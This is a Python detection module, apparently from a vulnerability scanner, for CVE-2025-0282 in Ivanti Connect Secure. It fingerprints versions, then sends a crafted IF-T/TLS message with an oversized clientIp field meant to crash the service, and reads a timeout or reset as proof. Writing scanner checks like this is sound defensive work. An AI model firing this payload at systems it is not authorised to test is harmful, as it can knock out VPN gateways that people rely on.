"""Agent Asteroid implementation for CVE-2025-0282"""

import datetime
import logging
import re
import socket
import ssl
import struct

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Ivanti Connect Secure Buffer Overflow"
VULNERABILITY_REFERENCE = "CVE-2025-0282"
VULNERABILITY_DESCRIPTION = """
A stack-based buffer overflow vulnerability in Ivanti Connect Secure before version 22.7R2.5, 
Ivanti Policy Secure before version 22.7R1.2, and Ivanti Neurons for ZTA gateways before 
version 22.7R2.3 allows a remote unauthenticated attacker to achieve remote code execution.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)

VERSION_PATTERN = re.compile(r'<PARAM NAME="ProductVersion"\s+VALUE="([0-9.]+)')
VULNERABLE_VERSIONS = [
    "22.7.1.907",  # IPS 22.7.1R1
    "22.7.1.1321",  # IPS 22.7.1R1.1
    "22.7.1.1485",  # IPS 22.7.1R1.2
]
CONNECTION_RESET = "connection reset by peer"
SWITCHING_PROTOCOL = b"HTTP/1.1 101 Switching Protocols"
ACCEPTED_SCHEME = "https"
ENDPOINT = "/dana-na/auth/url_admin/welcome.cgi?type=inter"
LENGTH_TO_READ = 16


def _rcv_ift(sock: ssl.SSLSocket) -> tuple[int, int, bytes]:
    """Receive IF-T message."""
    try:
        header = sock.read(LENGTH_TO_READ)
        if not header or len(header) != LENGTH_TO_READ:
            raise ValueError("Failed to read IF-T header")
        vendor, ptype, length, seqno = struct.unpack(">IIII", header)
        data = sock.read(length - LENGTH_TO_READ)
        if len(data) != length - LENGTH_TO_READ:
            raise socket.error("Incomplete IF-T data received")
        return vendor, ptype, data
    except (socket.error, ssl.SSLError) as e:
        logging.error("Error receiving IF-T message: %s", e)
        raise


def _send_ift(
    sock: ssl.SSLSocket, vendor: int, ptype: int, seqno: int, data: bytes
) -> None:
    """Send IF-T message."""
    hdr = struct.pack(">IIII", vendor, ptype, len(data) + LENGTH_TO_READ, seqno)
    sock.send(hdr + data)


def _negotiate_ifttls(host: str, scheme: str, port: int) -> ssl.SSLSocket:
    """Negotiate IF-T/TLS connection."""
    try:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(socket.create_connection((host, port), timeout=3))
    except socket.error as e:
        logging.error(
            "Socket connection failed for %s://%s:%d: %s", scheme, host, port, e
        )
        raise ConnectionError(
            f"{scheme}://{host}:{port}: Failed to create TLS socket connection"
        )
    req = b"GET / HTTP/1.1\r\n"
    req += f"Host: {host}\r\n".encode()
    req += b"User-Agent: BishopFox\r\n"
    req += b"Content-Type: EAP\r\n"
    req += b"Upgrade: IF-T/TLS 1.0\r\n"
    req += b"Content-Length: 0\r\n"
    req += b"\r\n"
    s.send(req)
    resp = s.recv(1024)
    if SWITCHING_PROTOCOL not in resp:
        raise ConnectionError(
            f"{scheme}://{host}:{port}: Server does not support IF-T/TLS"
        )
    return s


@exploits_registry.register
class IvantiConnectSecureExploit(webexploit.WebExploit):
    """
    CVE-2025-0282: Ivanti Connect Secure Buffer Overflow
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2025-0282"],
    )

    def _check_version(self, target: definitions.Target) -> bool:
        """Check if the target version is vulnerable."""
        try:
            resp = self.session.get(
                f"{target.origin}{ENDPOINT}",
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            resp.raise_for_status()

            match = VERSION_PATTERN.search(resp.text)
            if match is not None:
                version = match.group(1)
                # Check if version is below any of the patched versions
                if (
                    version.startswith("22.7.2.") is True
                    or version in VULNERABLE_VERSIONS
                ):
                    return True
                logging.info("Version not vulnerable")
            return False
        except requests_exceptions.RequestException:
            logging.error("Version check failed for %s", target.origin)
            return False

    def accept(self, target: definitions.Target) -> bool:
        """Check if target is an Ivanti Connect Secure instance."""
        return target.scheme.lower() == ACCEPTED_SCHEME and self._check_version(target)

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Check if target is vulnerable to buffer overflow."""
        vulnerabilities: list[definitions.Vulnerability] = []
        s = None

        try:
            s = _negotiate_ifttls(target.host, target.scheme, target.port or 443)

            # Send client version request
            _send_ift(s, 0x5597, 1, 0, b"\x00\x01\x02\x02")

            # Receive version response
            vendor, ptype, data = _rcv_ift(s)

            # Receive auth challenge
            vendor, ptype, data = _rcv_ift(s)

            # Send auth response
            payload = b"clientHostname=BishopFox"
            payload += b" clientIp=" + b"A" * 0x40
            payload += b"\n\0"
            _send_ift(s, 0xA4C, 0x88, 1, payload)
            _send_ift(s, 0xA4C, 0x88, 2, b"anonymous\n\0")

            # Check for vulnerability
            try:
                vendor, ptype, data = _rcv_ift(s)
                if vendor == 0xA4C and ptype == 0x93:
                    logging.info(
                        "%s://%s:%s: Patched", target.scheme, target.host, target.port
                    )
            except socket.timeout:
                logging.info(
                    "%s://%s:%s: Unexpected response: vendor=%s, type=%s, data=%s",
                    target.scheme,
                    target.host,
                    target.port,
                    hex(vendor),
                    hex(ptype),
                    data.hex(),
                )
                # Timeout indicates probable crash from buffer overflow
                vulnerabilities.append(self.create_vulnerability(target))
            except (socket.error, ssl.SSLError) as e:
                if CONNECTION_RESET in str(e).lower():
                    # Connection reset also indicates probable crash
                    vulnerabilities.append(self.create_vulnerability(target))

        except (socket.error, ssl.SSLError) as e:
            logging.error("Vulnerability check failed: %s", e)
        finally:
            try:
                if s is not None:
                    s.close()
            except socket.error as e:
                logging.error("Socket error while closing socket: %s", str(e))
                pass

        return vulnerabilities
